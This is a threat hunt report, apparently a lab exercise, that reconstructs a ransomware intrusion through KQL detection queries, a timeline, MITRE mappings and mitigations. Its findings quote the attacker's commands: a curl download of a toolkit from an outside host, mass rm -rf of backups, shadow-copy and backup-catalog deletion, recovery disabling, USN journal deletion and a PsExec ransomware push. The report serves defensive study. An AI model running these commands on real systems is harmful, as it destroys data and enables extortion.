# Threat Hunt Report: Multi-Platform Backup Destruction and Ransomware Deployment

## Executive Summary

Azuki Import & Export Trading Co. experienced a catastrophic ransomware attack on November 27, 2025, marking the culmination of a week-long intrusion. The investigation revealed a sophisticated multi-phase operation beginning with lateral movement from the compromised CEO workstation (azuki-adminpc) to the Linux backup server via SSH. This was followed by the: (1) systematic destruction of backup infrastructure; (2) Windows-based ransomware deployment using PsExec across multiple systems; (3) comprehensive recovery inhibition techniques; (4) establishment of persistent access mechanisms; (5) anti-forensic activities to eliminate evidence; and (6) successful encryption of organizational data with ransom note deployment. 

The threat actor demonstrated advanced operational maturity through coordinated backup destruction on Linux systems, simultaneous ransomware deployment to multiple Windows targets using stolen credentials, multiple layers of recovery inhibition including shadow copy deletion and backup catalog removal, registry and scheduled task persistence mechanisms, and USN journal deletion for anti-forensics. This investigation reconstructs the complete attack timeline, documenting tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) operations targeting logistics companies in the East Asia region.

## Background
- **Incident Date:** November 25-27, 2025  
- **Compromised Host:** Linux backup server (azuki-backupsrv), Multiple Windows systems  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** High, featuring coordinated multi-platform ransomware operations

---

## Investigation Steps

### 1. Lateral Movement: Remote Access & Compromised Account

Searched for evidence of SSH lateral movement and discovered that the threat actor executed the following remote access command from the compromised workstation (azuki-adminpc): "ssh.exe" backup-admin@10.1.0.189. This established remote access to the Linux backup server at 10.1.0.189. This lateral movement occurred after the initial CEO PC compromise, indicating a deliberate escalation phase targeting recovery infrastructure. In addition, analysis of the SSH connection details confirmed that the threat actor used the backup-admin account to access the Linux backup server. This administrative account likely had elevated privileges on the backup infrastructure, providing full access to backup directories and scheduled jobs.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ssh.exe", "ssh")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine

```
<img width="2067" height="281" alt="DITW_Q1" src="https://github.com/user-attachments/assets/4f9fd76c-5919-4a7e-a0bc-4e27d30936f1" />

---

### 2. Lateral Movement: Attack Source

Searched for the attack source (i.e., the IP address that initiated the connection to the backup server) by examining network connections to the backup server and identified the source IP address as 10.1.0.108 (i.e., azuki-adminpc). The connection was established over SSH port 22, confirming the compromised CEO workstation as the pivot point for the attack. This also confirms the attack progression from executive system compromise to backup infrastructure targeting.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-adminpc"
| where RemoteIP == "10.1.0.189" and RemotePort == 22
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
<img width="2657" height="761" alt="DITW_Q2B" src="https://github.com/user-attachments/assets/b822c22f-3fdf-4f62-9023-e60369d8040c" />

---

### 3. Discovery: Directory Enumeration

Searched for evidence of directory enumeration and discovered that the threat actor executed the following directory listing command with detailed output (-la flags) to enumerate the main backup directory structure: ls --color=auto -la /backups/. This provided the threat actor with a detailed view of the backup directory structure, file permissions, and timestamps. This was followed by a more targeted enumeration of subdirectories (configs/, fileserver/, workstations/, etc).

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ls", "dir", "find")
| where ProcessCommandLine contains "backup"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2699" height="936" alt="DITW_Q4" src="https://github.com/user-attachments/assets/b3be2b8c-61e4-44ca-9c1c-27cf336b7f84" />

---

### 4. Discovery: File Search 

Searched for evidence of file search operations by the threat actor and discovered that the threat actor executed the following find command to locate all compressed backup archives in tar.gz format: find /backups -name *.tar.gz. This targeted search identified specific backup files for subsequent deletion, demonstrating the systematic targeting of recovery data for destruction before deploying ransomware.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "find"
| where ProcessCommandLine contains "backup"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2517" height="747" alt="DITW_Q5" src="https://github.com/user-attachments/assets/cf882bc7-0121-472d-81b7-adb8e2db365b" />

---

### 5. Discovery: Account Enumeration

Searched for evidence of local account enumeration on the Linux backup server and discovered that the threat actor executed the following command to access the /etc/passwd file: cat /etc/passwd. The /etc/passwd file contains user account information (e.g, usernames, UIDs, home directories, shells) and was accessed in order to enumerate all local user accounts on the backup server. This likely helped the threat actor to understand what accounts exist on the system, potentially providing intelligence for privilege escalation and lateral movement planning.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("cat", "id", "whoami", "users", "w", "who")
| where ProcessCommandLine contains "/etc/passwd" 
    or ProcessCommandLine contains "/etc/shadow"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated desc

```
<img width="2380" height="288" alt="DITW_Q6" src="https://github.com/user-attachments/assets/91ffcae1-91b7-48bb-b717-ee0b93286f1c" />

---

### 6. Discovery: Scheduled Job Reconnaissance 

Searched for evidence of scheduled job enumeration and discovered that the threat actor executed the following command to access the crontab file in order to enumerate automated backup schedules: cat /etc/crontab. This revealed system-wide scheduled backup jobs, allowing the threat actor to understand backup schedules and timing for maximum impact.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("crontab", "cat", "ls", "systemctl")
| where ProcessCommandLine contains "cron" 
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2688" height="928" alt="DITW_Q7" src="https://github.com/user-attachments/assets/34e33cad-83ab-4d4e-b2f5-062811d9f824" />

---

### 7. Command and Control: Tool Transfer

Searched for evidence of external tool downloads and discovered that the threat actor executed the following command to download an attack toolkit named destroy.7z from external C2 infrastructure (i.e., litter.catbox.moe) using root privileges: curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z. 
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("curl", "scp", "ftp")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2444" height="295" alt="DITW_Q8" src="https://github.com/user-attachments/assets/3db67575-09ba-443b-aa60-6b45ff291e11" />

---

### 8. Credential Access: Credential Theft 

Searched for evidence of credential file access and discovered that the threat actor executed the following command to access stored credentials: cat /backups/configs/all-credentials.txt. The plaintext credential file likely contained stored authentication information and was accessed on the backup server. 

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("cat", "grep")
| where ProcessCommandLine contains "password" 
    or ProcessCommandLine contains "passwd"
    or ProcessCommandLine contains "credentials"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2194" height="676" alt="DITW_Q9" src="https://github.com/user-attachments/assets/77cd6f48-4521-4c63-9a66-2f818bef8111" />

---

### 9. Impact: Data Destruction

Searched for evidence of data destruction and discovered that the threat actor executed the following command to destroy back up files: rm -rf /backups/archives. The threat actor deleted all backup directories as root, including destroying daily, weekly, monthly, database, configuration, and workstation backups, thereby eliminating all recovery options. The full command is as follows: rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations.


**Query used to locate events:**

```kql
DeviceProcessEvents 
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("rm", "shred") 
| where ProcessCommandLine contains "/backups" 
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2805" height="856" alt="DITW_Q10" src="https://github.com/user-attachments/assets/d6b9adf0-10ef-4bb3-acaf-7e7c898dcfab" />

---

### 10. Impact: Service Stop  

Searched for evidence of service disruption and discovered that the threat actor executed the following command as root to stop the backup service: systemctl stop cron. The cron service was stopped using systemctl, immediately disabling all scheduled backup jobs. This was likely done to prevent any automated backup creation during the ransomware deployment phase.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName == "systemctl"
| where ProcessCommandLine has "stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2018" height="363" alt="DITW_Q11" src="https://github.com/user-attachments/assets/faf017a1-a32f-4d9a-8426-c4a2fbe4d82d" />

---
### 11. Impact: Service Disabled

Searched for evidence of permanent service disruption and discovered that the threat actor executed the following command to permanently disable the backup service: systemctl disable cron. This permanently disabled the cron service from starting on boot, ensuring backup jobs would not resume even after system restart.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName == "systemctl"
| where ProcessCommandLine has "disable"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1994" height="324" alt="DITW_Q12" src="https://github.com/user-attachments/assets/e8e7e8e3-48e1-4721-93e7-8252def3158b" />

---

### 12. Lateral Movement: Remote Execution, Deployment, & Malicious Payload

Searched for evidence of remote execution tool usage and discovered that the threat actor utilized the following tool to execute commands on remote systems: PsExec64.exe. PsExec64 is a Sysinternals remote administration tool that is commonly repurposed by threat actors for malware deployment. The tool was executed from the compromised CEO workstation (i.e., azuki-adminpc) and likely used to execute commands on multiple remote Windows systems simultaneously. In addition, the threat actor executed the following deployment command: "PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe. The full PsExec64 command shows the target system (10.1.0.102), use of the kenji.sato account credentials, and the path to the ransomware payload executable. The -c flag copies the specified executable to the remote host for execution, and -f forces the copy even if a file with the same name already exists on the remote system. The the ransomware payload "silentlynx.exe" was deployed to C:\Windows\Temp\cache\.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("psexec.exe", "psexec64.exe", "wmic.exe", "wmiexec.py", "smbexec.py", "paexec.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2771" height="887" alt="DITW_Q13_14_15" src="https://github.com/user-attachments/assets/e958a00a-0d1e-47f9-9f8b-46d8a3b6c0f6" />

---

### 13. Impact: Shadow Service Stopped 

Searched for evidence of shadow copy service disruption and discovered that the threat actor executed the following command to programmatically terminate the Volume Shadow Copy Service: "net" stop VSS /y. This immediately stopped the VSS service on multiple systems, using the /y flag to bypass interactive confirmation prompts. The threat actor likely executed this command to prevent the OS from creating automated recovery points during the encryption process, thereby hindering data restoration efforts.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "vss" and ProcessCommandLine contains "stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1788" height="481" alt="DITW_Q16" src="https://github.com/user-attachments/assets/8ad49792-c574-4e34-82ff-d9d4482dca04" />

---

### 14. Impact: Backup Engine Stopped 

Searched for evidence of backup engine disruption and discovered that the threat actor executed the following command to stop the Windows Backup Engine: "net" stop wbengine /y. This was likely done to stop Windows Backup from creating automated backups during encryption (i.e., the attack).

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("net.exe", "net1.exe", "sc.exe")
| where ProcessCommandLine contains "stop"
| where ProcessCommandLine contains "backup" 
    or ProcessCommandLine contains "wbengine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1828" height="480" alt="DITW_Q17" src="https://github.com/user-attachments/assets/1e503ca0-9c3f-4418-9a49-a0477d10d6bf" />

---

### 15. Defense Evasion: Process Termination

Searched for evidence of process termination and discovered that the threat actor executed the following process termination command to forcefully terminate SQL Server: "taskkill" /F /IM sqlservr.exe. In addition, other database processes (e.g., MySQL, Oracle, PostgreSQL, MongoDB) and Office applications (e.g., Outlook, Excel, Word) were also forcefully terminated across multiple systems. This was likely performed to release file locks on high-value data stores, ensuring the ransomware could successfully encrypt the underlying database files and documents without interference.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("taskkill.exe", "wmic.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1894" height="937" alt="DITW_Q18" src="https://github.com/user-attachments/assets/16ddd328-4ee1-404b-afbd-0df5451b1b10" />

---

### 16. Impact: Recovery Point Deletion

Searched for evidence of recovery point deletion and discovered that the threat actor executed the following command: "vssadmin.exe" delete shadows /all /quiet. Therefore, all volume shadow copies were deleted using vssadmin with the /quiet flag to suppress output. This eliminated all Windows restore points and previous file versions, making file-level recovery impossible through native Windows mechanisms.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("vssadmin.exe", "wmic.exe", "wbadmin.exe")
| where ProcessCommandLine contains "delete" 
    and (ProcessCommandLine contains "shadow" 
         or ProcessCommandLine contains "catalog"
         or ProcessCommandLine contains "backup")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2097" height="616" alt="DITW_Q19" src="https://github.com/user-attachments/assets/0f757a85-b778-4226-8390-3e9e80cb1522" />

---

### 17. Impact: Storage Limitation

Searched for evidence of storage limitation operations and discovered that the threat actor executed the following vssadmin resize command to place restrictions on shadow copy storage allocation: "vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB. Therefore, shadow copy storage was restricted to a minimal 401MB, effectively preventing the creation of new shadow copies due to insufficient space allocation. This ensures that even if shadow copy services are restarted, no new recovery points can be created.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "vssadmin.exe"
| where ProcessCommandLine contains "resize" 
    or ProcessCommandLine contains "maxsize"
    or ProcessCommandLine contains "storage"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2452" height="467" alt="DITW_Q20B" src="https://github.com/user-attachments/assets/fd97741f-7822-4012-b448-d2497b544f22" />

---

### 18. Impact: Recovery Disabled

Searched for evidence of recovery environment disabling events and discovered that the threat actor executed the following command to disable the Windows Recovery Environment: "bcdedit" /set {default} recoveryenabled No. Therefore, the Windows Recovery Environment was permanently disabled using bcdedit, preventing users from booting into recovery mode to restore their system or access repair tools. This effectively removed another critical recovery path.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("bcdedit.exe", "reg.exe", "powershell.exe", "wmic.exe", "diskpart.exe")
| where ProcessCommandLine contains "recoveryenabled" 
    or ProcessCommandLine contains "bootstatuspolicy"
    or ProcessCommandLine contains "storage"
    or ProcessCommandLine contains "quota"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2792" height="397" alt="DITW_Q21" src="https://github.com/user-attachments/assets/25686061-e6e3-43ae-b068-8a6f5551219d" />

---

### 19. Impact: Catalog Deletion

Searched for evidence of backup catalog deletion and discovered that the threat actor executed the following command to delete the Windows Backup catalog database: "wbadmin" delete catalog -quiet. Without the catalog, Windows Backup cannot locate or restore any previous backups, even if the backup files still exist.


**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "wbadmin.exe"
| where ProcessCommandLine contains "catalog" or ProcessCommandLine contains "delete"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2038" height="336" alt="DITW_Q22" src="https://github.com/user-attachments/assets/d11273e0-0426-47f0-949f-57a9acb45a43" />

---

### 20. Persistence: Registry Autorun

Searched for registry autorun modifications and discovered that the threat actor created a registry Run key named WindowsSecurityHealth. This was configured to execute a malicious binary, silentlynx.exe, located in the C:\Windows\Temp\ directory upon user login. By using a value name that mimics a legitimate Windows security component, it's able to masquerade as a system process in order to avoid detection and ensure that the malware remains active across system reboots.

**Query used to locate events:**

```kql
DeviceRegistryEvents
| where TimeGenerated >= datetime(2025-11-25 05:00:00)
| where DeviceName contains "azuki"
| where RegistryKey contains "Run" 
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| sort by TimeGenerated asc

```
<img width="2701" height="381" alt="DITW_Q23" src="https://github.com/user-attachments/assets/c1c0ffd7-dde1-434c-a600-a57693987906" />

---

### 21. Persistence: Scheduled Execution

Searched for evidence of scheduled task persistence and discovered that the threat actor created a scheduled task under the Microsoft\Windows\Security path to execute silentlynx.exe at user logon with highest privileges. The task name SecurityHealthService mimics legitimate Windows security tasks, providing stealth and persistence through system reboots and user session changes. This provides redundant persistence alongside the registry autorun mechanism.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28)) 
| where DeviceName contains "azuki" 
| where FileName == "schtasks.exe" 
| where ProcessCommandLine contains "create" 
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine

```
<img width="2775" height="877" alt="DITW_Q24B" src="https://github.com/user-attachments/assets/f04ce935-edd8-43ce-9b93-d62dcc226f26" />

---

### 22. Defense Evasion: Journal Deletion

Searched for evidence of anti-forensic activities (i.e., journal deletion) and discovered that the threat actor executed the following file system utility command to delete the NTFS Update Sequence Number (USN) journal: "fsutil.exe" usn deletejournal /D C:. This removes the file system journal that tracks every file system change including creates, deletes, modifications, and renames; thereby, eliminating critical forensic evidence needed to reconstruct ransomware encryption activity and determine the full scope of file modifications.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("fsutil.exe", "wevtutil.exe")
| where ProcessCommandLine contains "delete" 
    or ProcessCommandLine contains "usn"
    or ProcessCommandLine contains "journal"
    or ProcessCommandLine contains "clear"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```
<img width="2082" height="265" alt="DITW_Q25" src="https://github.com/user-attachments/assets/72d7245c-cd5e-4788-ba89-a75c458f6db8" />

---

### 23. Impact: Ransom Note

Searched for ransom note file creation events and discovered that the ransom note file SILENTLYNX_README.txt was created by silentlynx.exe and deployed to Desktop and Documents folders across compromised systems. The filename branding "SILENTLYNX" aligns with the ransomware executable name "silentlynx.exe" and ADE SPIDER's operational patterns. 

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28)) 
| where DeviceName contains "azuki" 
| where FileName endswith ".txt" 
| where ActionType == "FileCreated" 
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName

```
<img width="2684" height="430" alt="DITW_Q26" src="https://github.com/user-attachments/assets/75e61221-91fa-45f7-8041-7b710dec5869" />

---

## Summary

The analysis revealed a sophisticated ransomware attack against Azuki Import & Export Trading Co. The threat actor demonstrated advanced capabilities including cross-platform compromise (Linux and Windows), systematic backup elimination, comprehensive recovery inhibition, dual persistence mechanisms, and anti-forensics measures. The threat actor first compromised the Linux backup infrastructure via SSH from a previously compromised CEO workstation, systematically destroyed all backups, downloaded attack tools from external C2 infrastructure, then pivoted to Windows systems using PsExec to deploy the SILENTLYNX ransomware. 

Before encryption, the threat actor disabled all recovery mechanisms including VSS, Windows Backup, and boot recovery, terminated database and application processes to unlock files, established persistence through registry autoruns and scheduled tasks, and deleted forensic evidence. The sophistication of this attack, including the pre-encryption elimination of backup infrastructure and the use of multiple persistence mechanisms, indicates an experienced threat actor with in-depth knowledge of enterprise backup architectures and Windows recovery mechanisms.

---

## Timeline

| Time (UTC) | Action Observed | Key Evidence |
|:------------:|:-----------------:|:--------------:|
| 2025-11-24 14:13:34Z | Directory Enumeration | ls --color=auto -la /backups/ executed on backup server |
| 2025-11-24 14:14:14Z | Credential Theft | Access to all-credentials.txt containing stored credentials |
| 2025-11-24 14:16:06Z | File Search | find /backups -name *.tar.gz to identify backup archives |
| 2025-11-24 14:16:08Z | Account and Job Reconnaissance | Enumeration of /etc/passwd and /etc/crontab for backup schedules |
| 2025-11-25 05:39:10Z | SSH Lateral Movement | SSH connection from 10.1.0.108 (azuki-adminpc) to backup server using backup-admin account |
| 2025-11-25 05:45:34Z | Tool Transfer | Download of destroy.7z from litter.catbox.moe via curl |
| 2025-11-25 05:47:02Z | Backup Destruction | rm -rf /backups/archives - systematic deletion of all backup directories |
| 2025-11-25 05:47:03Z | Service Disruption | systemctl stop cron and systemctl disable cron to prevent scheduled backups |
| 2025-11-25 05:58:55Z | Recovery Point Deletion | vssadmin.exe delete shadows /all /quiet - all shadow copies deleted |
| 2025-11-25 05:59:56Z | Storage Limitation | vssadmin resize shadowstorage to 401MB maximum |
| 2025-11-25 06:03:47Z | Ransomware Deployment | PsExec64.exe deployment of silentlynx.exe to target systems |
| 2025-11-25 06:04:53Z | Shadow Service Stopped | net stop VSS /y to halt shadow copy service |
| 2025-11-25 06:04:54Z | Backup Engine Stopped | net stop wbengine /y to halt Windows Backup Engine |
| 2025-11-25 06:04:57Z | Process Termination | taskkill /F /IM sqlservr.exe and other database/application processes |
| 2025-11-25 06:04:59Z | Recovery Disabled | bcdedit to disable recovery environment and wbadmin delete catalog |
| 2025-11-25 06:05:01Z | Persistence and Impact | Registry autorun (WindowsSecurityHealth), scheduled task (SecurityHealthService), and SILENTLYNX_README.txt deployed |
| 2025-11-25 06:10:04Z | Anti-Forensics | fsutil.exe usn deletejournal /D C: to remove forensic evidence |

---

This timeline reconstructs the chronological sequence of the threat actor's activities across both Linux and Windows environments. The attack progressed systematically from initial reconnaissance on November 24, 2025, through credential theft and backup enumeration, culminating in a coordinated multi-phase ransomware deployment on November 25, 2025. The threat actor demonstrated sophisticated operational security by first eliminating all backup infrastructure on the Linux backup server before deploying ransomware to Windows systems, followed by comprehensive recovery inhibition measures and anti-forensic activities to complicate incident response.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1021.004 | Remote Services: SSH | SSH used for lateral movement to Linux backup server | Identifies initial access vector and cross-platform compromise |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | PsExec deployment across Windows systems | Detects ransomware distribution method |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credentials stolen from all-credentials.txt on backup server | Reveals credential compromise enabling lateral movement |
| T1083 | File and Directory Discovery | Directory enumeration and file searches for backup archives | Shows reconnaissance phase targeting backup infrastructure |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Reconnaissance of cron jobs and creation of malicious scheduled task | Identifies backup timing intelligence and persistence mechanism |
| T1105 | Ingress Tool Transfer | Download of destroy.7z from litter.catbox.moe | Reveals C2 infrastructure and tool staging |
| T1485 | Data Destruction | Systematic destruction of all backup directories on Linux server | Critical impact event eliminating recovery capabilities |
| T1489 | Service Stop | Multiple services stopped and disabled (cron, VSS, wbengine) | Shows systematic disabling of backup and recovery services |
| T1490 | Inhibit System Recovery | Shadow copies deleted, storage limited, recovery disabled, catalog deleted | Comprehensive recovery inhibition across multiple mechanisms |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Process termination of databases and applications to unlock files | Enables file encryption by removing file locks |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | WindowsSecurityHealth registry value for ransomware persistence | Primary persistence mechanism ensuring re-infection |
| T1070.004 | Indicator Removal: File Deletion | USN journal deletion to remove forensic evidence | Anti-forensics measure hindering investigation |
| T1486 | Data Encrypted for Impact | SILENTLYNX ransomware deployment and encryption with ransom notes | Final impact demonstrating successful ransomware operation |

---

This table organizes the MITRE ATT&CK techniques observed during the investigation. The detection methods identified cross-platform compromise between Linux and Windows systems, systematic backup destruction, comprehensive recovery inhibition through multiple mechanisms, and dual persistence layers. The attack included multi-target ransomware deployment via PsExec and anti-forensic activities to complicate incident response. The breadth and coordination of these techniques demonstrated advanced threat actor capabilities consistent with experienced ransomware operators.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Implemented MFA for all administrative accounts including SSH access | Enforced multi-factor authentication for all privileged accounts across Windows and Linux systems to prevent credential-based lateral movement | Prevents unauthorized access even if credentials are compromised |
| M1026 | Privileged Account Management | Reset credentials and implemented mandatory password rotation | Reset credentials for backup-admin and all administrative accounts, implemented mandatory 90-day password rotation with complexity requirements, removed stored credential files | Mitigates compromised credential risk and prevents future credential theft |
| M1031 | Network Segmentation | Isolated backup infrastructure on separate network segment | Implemented network segmentation isolating backup servers on dedicated VLAN with strict firewall rules limiting SSH access to jump hosts only | Prevents lateral movement to critical backup infrastructure |
| M1053 | Data Backup | Implemented offline immutable backups | Deployed 3-2-1 backup strategy with offline immutable backups stored on air-gapped systems, configured WORM storage for critical data | Ensures recovery capability even if online backups are compromised |
| M1018 | User Account Management | Implemented principle of least privilege | Conducted access review and removed unnecessary administrative privileges, implemented just-in-time privileged access for administrative tasks | Reduces attack surface by limiting privileged account exposure |
| M1047 | Audit | Enhanced logging and monitoring | Enabled enhanced logging for PsExec usage, VSS operations, scheduled task creation, backup server access, and registry Run key modifications with SIEM alerting | Enables early detection of similar attack patterns |
| M1040 | Behavior Prevention on Endpoint | Deployed EDR with behavioral detection | Implemented endpoint detection and response solution with behavioral analysis for ransomware activity, process injection, credential access, and recovery inhibition techniques | Provides real-time detection and blocking of malicious behavior |
| M1022 | Restrict File and Directory Permissions | Restricted access to sensitive files | Removed world-readable permissions on credential files, restricted backup directory access to service accounts only, implemented file integrity monitoring | Prevents unauthorized credential and configuration file access |
| M1017 | User Training | Conducted security awareness training | Delivered mandatory security awareness training for all users and administrators focusing on ransomware tactics, social engineering, and incident reporting procedures | Improves human detection capabilities and reduces initial compromise risk |

---

The following response actions were recommended: (1) Isolating the compromised endpoints from the network to prevent further malicious activity; (2) Removing scheduled task and registry persistence entries; (3) Restoring systems from offline immutable backups; (4) Resetting user credentials and enforcing MFA; (5) Conducting full malware scans with updated signatures; (6) Implementing enhanced monitoring for PsExec usage, VSS operations, and backup access; (7) Deploying network segmentation for backup infrastructure; (8) Establishing detection rules for cross-platform lateral movement and recovery inhibition attempts; (9) Implementing offline immutable backup strategy to ensure recovery capability.

---
